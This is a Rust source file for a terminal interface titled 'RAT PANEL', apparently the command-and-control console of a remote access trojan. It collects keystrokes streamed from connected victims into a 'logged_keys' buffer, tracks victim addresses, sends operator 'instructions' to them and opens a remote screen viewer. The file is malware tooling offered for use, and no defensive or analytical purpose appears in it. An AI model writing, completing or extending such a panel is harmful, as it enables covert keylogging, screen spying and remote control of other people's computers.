#![allow(unused)]
mod app;
mod ui;
mod server;

use app::App;
use std::error::Error;
use std::io;
use std::net::SocketAddr;
use std::time::{Duration, Instant};
use std::io::Cursor;

use crossterm::event::{self, DisableMouseCapture, EnableMouseCapture, KeyCode, Event, EventStream};
use crossterm::execute;
use crossterm::terminal::{
    EnterAlternateScreen, LeaveAlternateScreen, disable_raw_mode, enable_raw_mode,
};
use ratatui::Terminal;
use ratatui::backend::{Backend, CrosstermBackend};

use ratatui_image::{
    thread::{ThreadProtocol, ResizeRequest},
    picker::Picker,
};

use image::{DynamicImage, ImageReader};
use color_eyre::Result;
use futures::{FutureExt, StreamExt};

use crate::server::ClientEvent;

fn handle_keys(app: &mut App, event: ClientEvent) -> Result<(), Box<dyn Error>> {
    match event {
        ClientEvent::Connected(addr) => app.client.addr1 = addr.to_string(),
        ClientEvent::Data(bytes) => app.logged_keys.push_str(std::str::from_utf8(&bytes)?),
        ClientEvent::Disconnected => app.client.addr1 = "".to_string(),
    }
    Ok(())
}

async fn handle_app_event(app: &'_ mut App<'_>, event: Result<Event, std::io::Error>) -> Result<(), Box<dyn Error>> {
    if let Some(key_event) = event?.as_key_press_event() {
        match key_event.code {
            KeyCode::Tab => app.on_right(),
            KeyCode::BackTab => app.on_left(),
            KeyCode::Backspace => app.delete_char(),
            KeyCode::Enter => app.submit_instructions().await,    
            KeyCode::Left => app.move_cursor_left(),
            KeyCode::Right => app.move_cursor_right(),
            KeyCode::F(1) => app.open_screen_viewer(),
            KeyCode::Char(to_insert) => app.enter_char(to_insert),
            KeyCode::Esc => return Ok(()),
            _ => {}
        }
    }

    Ok(())
}

pub async fn run(tick_rate: Duration) -> Result<(), Box<dyn Error>> {
    enable_raw_mode()?;
    let mut stdout = io::stdout();
    execute!(stdout, EnterAlternateScreen, EnableMouseCapture)?;
    let backend = CrosstermBackend::new(stdout);
    let mut terminal = Terminal::new(backend)?;

    let app = App::new(" ◈ RAT PANEL ").await;
    let app_result = run_app(&mut terminal, app, tick_rate).await;

    disable_raw_mode()?;
    execute!(
        terminal.backend_mut(),
        LeaveAlternateScreen,
        DisableMouseCapture
    )?;
    terminal.show_cursor()?;

    if let Err(err) = app_result {
        println!("{err:?}");
    }

    Ok(())
}

async fn run_app<B: Backend>(
    terminal: &mut Terminal<B>,
    mut app: App<'_>,
    tick_rate: Duration,
) -> Result<(), Box<dyn Error>>
where
    B::Error: 'static,
{
    let mut event_stream = EventStream::new();
    let mut last_tick = Instant::now();
    loop {
        terminal.draw(|frame| ui::render(frame, &mut app))?;

        tokio::select! {
            Some(event) = app.client.app_receiver.recv() => handle_keys(&mut app, event)?,
            Some(event) = event_stream.next().fuse() => handle_app_event(&mut app, event).await?,
        }

        let timeout = tick_rate.saturating_sub(last_tick.elapsed());
        if !event::poll(timeout)? {
            app.on_tick();
            last_tick = Instant::now();
            continue;
        }
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let tick_rate = Duration::from_millis(250);
    run(tick_rate).await?;
    Ok(())
}
